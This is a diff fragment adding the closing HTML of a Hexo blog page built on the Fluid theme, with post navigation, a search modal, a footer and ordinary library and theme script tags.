+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/11/ffi/">
+                        <span class="hidden-mobile">buu（八）</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
